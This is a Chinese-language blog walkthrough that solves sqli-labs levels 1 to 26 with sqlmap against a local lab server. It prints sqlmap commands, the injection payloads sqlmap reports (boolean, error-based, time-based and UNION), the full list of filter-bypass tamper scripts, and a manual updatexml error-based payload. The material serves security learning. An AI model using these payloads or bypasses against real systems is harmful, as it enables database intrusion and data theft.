---
title: sqlmap 解决 sqli-labs
date: 2020-9-10 16:04:30
categories:
- PHP
tags:
- sql-injection
- sqlmap
image:
  path: /assets/img/sql_injection_index.png

toc: true
---


<!-- # Sqlmap、脚本解决sqli-labs -->

## less1

```sh
sqlmap -u http://192.168.133.162/sql/Less-1/index.php?id=1 --batch --dbs
```



## less2

```sh
sqlmap -u http://192.168.133.162/sql/Less-2/index.php?id=1 --batch --dbs
```



## less3

```sh
sqlmap -u http://192.168.133.162/sql/Less-3/index.php?id=1 --batch --dbs
```



## less4

```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```



## less5

```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：报错注入，时间盲注

```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 223 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9191=9191 AND 'tjNq'='tjNq

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5307 FROM(SELECT COUNT(*),CONCAT(0x716a787871,(SELECT (ELT(5307=5307,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'lDyx'='lDyx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7383 FROM (SELECT(SLEEP(5)))QnIP) AND 'rsQQ'='rsQQ

```



## less6



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入、报错注入，时间盲注



```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 207 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: id=1" AND 5041=5041#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1" AND (SELECT 3226 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(3226=3226,1))),0x717a6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zVCx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1" AND (SELECT 5756 FROM (SELECT(SLEEP(5)))oBoe)-- dZNC
---

```







## less7





```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注



```sh
sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 9250=9250 AND ('AWTH'='AWTH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 4903 FROM (SELECT(SLEEP(5)))eIgu) AND ('VQKm'='VQKm
---

```



##  less8



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注



```sh
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3254=3254 AND 'Eznz'='Eznz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2673 FROM (SELECT(SLEEP(5)))noGG) AND 'TnYF'='TnYF
---

```





## less9



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注

```sh
sqlmap identified the following injection point(s) with a total of 243 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6338=6338 AND 'zGGA'='zGGA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7400 FROM (SELECT(SLEEP(5)))lmWZ) AND 'pdvI'='pdvI
---

```



## less10

从10开始之前的payload不奏效了。

从天书里看出只是换成了双引号，其实很简单，所以这里用到之前学到的prefix的方法



```sh
sqlmap -u http://192.168.133.162/sql/Less-10/index.php?id=1 -p id --prefix "\""  --batch --dbs
```

二分注入、时间注入

```sh
sqlmap identified the following injection point(s) with a total of 798 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1" AND 4154=4154-- CDvk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1" AND (SELECT 9271 FROM (SELECT(SLEEP(5)))fjSc)-- pRRC
---

```



## less11

11是post注入

很简单，自动提交表单即可

```sh
sqlmap -u http://192.168.133.162/sql/Less-11/index.php --forms --dbs 
```



二分注入、报错注入、时间盲注、union注入

```sh
sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=HHNh' OR NOT 8084=8084#&passwd=&submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=HHNh' OR (SELECT 1351 FROM(SELECT COUNT(*),CONCAT(0x7176717171,(SELECT (ELT(1351=1351,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zuew&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=HHNh' AND (SELECT 8246 FROM (SELECT(SLEEP(5)))ctEF)-- Ezsb&passwd=&submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: uname=HHNh' UNION ALL SELECT CONCAT(0x7176717171,0x79456e586f4161764e7250446e485a67586e4a544e79484c756d6a4544536a717a5449576954656d,0x7170716b71),NULL#&passwd=&submit=Submit
---

```



## less12

与less1相同的payload

```sh
sqlmap -u http://192.168.133.162/sql/Less-12/index.php --forms --dbs 
```

报错、bool、时间、union都可以

```sh
sqlmap identified the following injection point(s) with a total of 134 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=hfRw") OR NOT 1620=1620#&passwd=&submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: uname=hfRw") AND EXTRACTVALUE(1777,CONCAT(0x5c,0x7178717171,(SELECT (ELT(1777=1777,1))),0x7171787a71)) AND ("FDGb"="FDGb&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=hfRw") AND (SELECT 6736 FROM (SELECT(SLEEP(5)))stfK) AND ("rnrd"="rnrd&passwd=&submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: uname=hfRw") UNION ALL SELECT CONCAT(0x7178717171,0x655955517a486b7555414f47504a745979774842526d654a524a78516348664142695048464e6665,0x7171787a71),NULL#&passwd=&submit=Submit
---

```







## less13

payload不变：

```sh
 sqlmap -u http://192.168.133.162/sql/Less-13/index.php --forms --dbs --batch
```

但是速度有点慢，可以参考之前的优化设置，也可以直接指定使用的注入方法--thread 10 --batch



可以看出是加上了 ')

```sh
sqlmap identified the following injection point(s) with a total of 1226 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=nosa') OR (SELECT 9280 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9280=9280,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jgQP&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=nosa') AND (SELECT 9185 FROM (SELECT(SLEEP(5)))QrLC)-- twvv&passwd=&submit=Submit
---

```





## less14

```sh
sqlmap -u http://192.168.133.162/sql/Less-14/index.php --forms --dbs --thread 10 --batch
```



双引号

```sh
sqlmap identified the following injection point(s) with a total of 1225 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=gVWd" OR (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(7011=7011,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EcVM&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=gVWd" AND (SELECT 2546 FROM (SELECT(SLEEP(5)))meQb)-- cASj&passwd=&submit=Submit
---

```





## less15

```sh
sqlmap -u http://192.168.133.162/sql/Less-15/index.php --forms --dbs --thread 10 --batch
```

只能时间盲注，稍慢一点

```sh
sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=gtNL' AND (SELECT 4937 FROM (SELECT(SLEEP(5)))rzUm) AND 'KyvN'='KyvN&passwd=&submit=Submit
---

```





## less16

出现了无法注入的情况。看天书说是")

所以添加前缀

```sh
sqlmap -u http://192.168.133.162/sql/Less-16/index.php --forms --dbs --thread 10 --prefix "\")"  --batch
```



```sh
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=JQyQ") AND (SELECT 3582 FROM (SELECT(SLEEP(5)))vtUP)-- bCkY&passwd=&submit=Submit
---

```





## less17

第17关对uname参数有checkinput保护，如果不想绕过uname的话，注入点其实在passwd。



但是由于uname是一个确定的用户才能更新数据，所以这里不能自动填写表单了

```sh
sqlmap -u http://192.168.133.162/sql/Less-17/index.php --data "uname=admin&passwd=&submit=Submit" --dbs --thread 10  --prefix "'" -p passwd --batch
```

报错注入、时间注入

```sh
sqlmap identified the following injection point(s) with a total of 1880 HTTP(s) requests:
---
Parameter: passwd (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin&passwd=' OR (SELECT 4589 FROM(SELECT COUNT(*),CONCAT(0x7178706b71,(SELECT (ELT(4589=4589,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hurJ&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: uname=admin&passwd=' OR (SELECT 8521 FROM (SELECT(SLEEP(5)))AJtH)-- HnnG&submit=Submit
---

```



如果绕过转义，这里主要是绕过mysql_real_escape_string后再次加上单引号的限制， 暂时不知道如何进行绕过



## less18

这一关是user-agent注入

> sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。

例如： -p "id,user-agent"



想要执行到注入点需要提供正确的uname和passwd

```sh
sqlmap -u http://192.168.133.162/sql/Less-18/index.php --data "uname=admin&passwd=admin&submit=Submit" --dbs --thread 10  -p "user-agent"  --batch
```

![image-20200517191226342](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200517191226342.png)



sqlmap发包默认如图，可以使用random-agent参数或者直接--user-agent参数指定。

可以使用报错注入和时间盲注。

```sh
sqlmap identified the following injection point(s) with a total of 1582 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: sqlmap/1.4#stable (http://sqlmap.org)' AND EXTRACTVALUE(8499,CONCAT(0x5c,0x71626a7171,(SELECT (ELT(8499=8499,1))),0x7170717871)) AND 'anbC'='anbC

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: sqlmap/1.4#stable (http://sqlmap.org)' RLIKE SLEEP(5) AND 'bpJy'='bpJy
---

```



## less19

与18关类似，这一关是考察referer字段

```sh
sqlmap -u http://192.168.133.162/sql/Less-19/index.php --data "uname=admin&passwd=admin&submit=Submit" --dbs --thread 10  -p "referer"  --batch
```



```sh
sqlmap identified the following injection point(s) with a total of 413 HTTP(s) requests:
---
Parameter: Referer (Referer)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' RLIKE (SELECT (CASE WHEN (1980=1980) THEN 0x687474703a2f2f3139322e3136382e3133332e3136323a38302f73716c2f4c6573732d31392f696e6465782e706870 ELSE 0x28 END)) AND 'ARWO'='ARWO

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' AND EXTRACTVALUE(8119,CONCAT(0x5c,0x71766b6b71,(SELECT (ELT(8119=8119,1))),0x7162707671)) AND 'nKgQ'='nKgQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' RLIKE SLEEP(5) AND 'FSNZ'='FSNZ
---

```





## less20



我们需要在cookie中带上uname字段。并且不需要有submit字段，测试cookie只需要level2即可

```sh
sqlmap -u http://192.168.133.162/sql/Less-20/index.php --cookie="uname=admin" --dbs --thread 10 --level 2  --batch 
```



```sh
Cookie parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin' AND 6687=6687 AND 'KySP'='KySP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin' AND (SELECT 4501 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(4501=4501,1))),0x716b767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'AXTs'='AXTs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4107 FROM (SELECT(SLEEP(5)))MHaz) AND 'sLBD'='sLBD

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: uname=-2840' UNION ALL SELECT CONCAT(0x7178787071,0x4d466f624d544e746e5669714a4e5a4b76686e6c7042487153507763574256777855626f58717868,0x716b767671),NULL,NULL-- AKIY
---

```



## less21

这一关对cookie中的uname字段进行了base64编码

可以使用sqlmap  --list-tampers 查看所有tampers，和base64编码相关的是base64encode.py

```sh
* apostrophemask.py - Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
* apostrophenullencode.py - Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload
* base64encode.py - Base64-encodes all characters in a given payload
* between.py - Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
* chardoubleencode.py - Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
* charencode.py - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
* charunicodeencode.py - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
* charunicodeescape.py - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
* commalesslimit.py - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
* commalessmid.py - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
* concat2concatws.py - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
* equaltolike.py - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
* escapequotes.py - Slash escape single and double quotes (e.g. ' -> \')
* greatest.py - Replaces greater than operator ('>') with 'GREATEST' counterpart
* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
* hex2char.py - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
* ifnull2casewhenisnull.py - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
* ifnull2ifisnull.py - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
* least.py - Replaces greater than operator ('>') with 'LEAST' counterpart
* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -> select)
* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment
* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment
* multiplespaces.py - Adds multiple spaces (' ') around SQL keywords
* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
* overlongutf8more.py - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
* percentage.py - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
* plus2concat.py - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
* plus2fnconcat.py - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
* randomcase.py - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
* sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
* space2comment.py - Replaces space character (' ') with comments '/**/'
* space2dash.py - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
* space2hash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2morecomment.py - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
* space2morehash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2mssqlblank.py - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mssqlhash.py - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
* space2mysqlblank.py - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mysqldash.py - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
* space2plus.py - Replaces space character (' ') with plus ('+')
* space2randomblank.py - Replaces space character (' ') with a random blank character from a valid set of alternate characters
* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
* unmagicquotes.py - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
* uppercase.py - Replaces each keyword character with upper case value (e.g. select -> SELECT)
* varnish.py - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment
* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment
* xforwardedfor.py - Append a fake HTTP header 'X-Forwarded-For' (and alike)
[07:50:31] [WARNING] you haven't updated sqlmap for more than 136 days!!!
```




```sh
sqlmap -u http://192.168.133.162/sql/Less-21/index.php --cookie="uname=admin" --dbs --thread 10 --level 2  --tamper "base64encode.py" --batch
```





报错注入、时间盲注、bool盲注

```sh
Cookie parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin') AND 5369=5369 AND ('iQxR' LIKE 'iQxR

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin') AND (SELECT 7756 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT (ELT(7756=7756,1))),0x71717a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('XAYM' LIKE 'XAYM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin') AND (SELECT 4840 FROM (SELECT(SLEEP(5)))xHLI) AND ('NCtt' LIKE 'NCtt

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: uname=-1690') UNION ALL SELECT 7354,7354,CONCAT(0x71626b7071,0x436d455544674777774e596b4d736d666d41514e784369594447524264716e6f6b4f444e52657454,0x71717a7871)#
---

```



## less22

与上一关没有太大区别，payload一致

```sh
sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin" AND 2420=2420 AND "oiis"="oiis

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin" AND (SELECT 3162 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3162=3162,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "KDER"="KDER

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin" AND (SELECT 3871 FROM (SELECT(SLEEP(5)))FnVE) AND "GAqW"="GAqW

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: uname=-9694" UNION ALL SELECT CONCAT(0x7176766a71,0x534b4a6c6748675549714b5253726363584546487753484c4a6a584c7745506b736d5461417a5072,0x7171787871),2413,2413#
---

```



## less23

从less23开始加入一些过滤，这里可以使用内置tamper或者自己编写的tamper进行绕过，这一关只是过滤了注释符，闭合是可以的

```sh
sqlmap -u http://192.168.133.162/sql/Less-23/index.php?id=1  --dbs --thread 10 --batch
```

```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4202=4202 AND 'oxkU'='oxkU

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1312 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(1312=1312,1))),0x7170627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CjmC'='CjmC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6430 FROM (SELECT(SLEEP(5)))EFyw) AND 'hGlI'='hGlI
---
```





## less24

24关为二次注入绕过登录限制。这里暂时不用sqlmap了

关于sqlmap和自定义tamper利用二次注入的大神文章也有：

- [使用Burp和自定义Sqlmap Tamper利用二次注入漏洞](https://www.freebuf.com/articles/web/142963.html)
- [记一份SQLmap使用手册小结（一）](https://xz.aliyun.com/t/3010)



或者使用sqlmap 的二次注入功能

参数：`–second-order`

有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。

`–second-order`后面跟一个判断页面的URL地址。





## less25

这一关主要是绕过or 和 and 过滤，替换方法有如下：

- （1）大小写变形 Or,OR,oR 
- （2）编码，hex，urlencode 
- （3）添加注释/*or*/ 
- （4）利用符号 and=&& or=||

sqlmap 对于or和and 替换成 && 与 || 有内置tamper symboliclogical.py

没有加tamper时，显示无法注入

加上之后，可以成功，但是并没有返回所有数据库，显示在查询数据库数量的时候出现错误

```sh
sqlmap -u http://192.168.133.162/sql/Less-25/index.php?id=1  --dbs --thread 10 --batch --tamper "symboliclogical.py"
```


```sh
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2505=2505 AND 'XqwA'='XqwA

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(2208,CONCAT(0x5c,0x7176787671,(SELECT (ELT(2208=2208,1))),0x716b627671)) AND 'TFVC'='TFVC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3398 FROM (SELECT(SLEEP(5)))PPqA) AND 'xghV'='xghV
---

```





## less25a

payload与上一关一致，但是也无法获取数据库数量：[08:50:10] [ERROR] unable to retrieve the number of databases


```sh
sqlmap -u http://192.168.133.162/sql/Less-25a/index.php?id=1  --dbs --thread 5 --batch --tamper "symboliclogical.py" -D "security" --tables
```

```sh
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6237=6237

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6319 FROM (SELECT(SLEEP(5)))wIaO)
---

```





## less26

这一关主要考察过滤空格的绕过，有些特殊字符在windows下apache无法解析。

- %09 TAB 键（水平） 
- %0a 新建一行 
- %0c 新的一页 
- %0d return 功能 
- %0b TAB 键（垂直） 
- %a0 空格
- /**/
- ()

这一关结合了25，将空格，or，and,/*,#,--,/等各种符号过滤

直接跑无法成功，加上tamper  space2comment.py 可以把' ' 编程 '/**/' ，也可以使用space2mysqlblank.py，但是后者无法检测出漏洞。此处为我的环境原因，可能无法解析如上的一些特殊字符



```sh
sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --current-db --thread 5 --tamper "space2comment.py;symboliclogical.py" --batch --technique E -v 3
```



```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1562 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(5063,CONCAT(0x5c,0x716b7a7671,(SELECT (ELT(5063=5063,1))),0x71767a6a71)) AND 'PxYC'='PxYC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: id=1' AND SLEEP(5) AND 'mExo'='mExo
---
```



尽管获得了注入点和方式，但是却无法获取到数据库，估计与tamper的处理有所关系。

使用 -v 3 参数获取发送的payload

```sh
1'/**/%26%26/**/EXTRACTVALUE(9494,CONCAT(0x5c,0x716b7a7671,(SELECT/**/REPEAT(0x38,8)),0x71767a6a71))/**/%26%26/**/'DeJl'='DeJl
```



可以看出sqlmap在处理空格替换的时候没有处理好最后一个单引号，连接起来后可能因为mysql版本问题或者是字符解析问题，有些字符无法奏效。看来上面成功检测漏洞实际上是假象，使用上面的payload并不能奏效。



尝试自己写tamper，将其修改



先手工测试一下报错注入：

`id=2'<>(select(updatexml(1,concat(0x2b,version(),0x2b),1)))<>'1`

接下来就是在sqlmap中添加前后缀，



```sh
sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --dbs --thread 5 --tamper "symboliclogical.py;space2comment.py" --prefix "2'<>(" --suffix ")<>'1"  --batch -v 3 --technique E
```

但是无法奏效，查阅资料后发现是/**/只对特定的mysql版本有效（难怪报错的时候给我报个连着的select和version）



查看了一下sqlmap对updatexml的支持：

```sh
2'<>((UPDATEXML(1474,CONCAT(0x2e,0x7176786a71,(SELECT/**/REPEAT(0x34,64)),0x7170767171),5807)))<>'1
```

中间换成(SELECT(REPEAT(0x34,64)))就可以成功回显了。



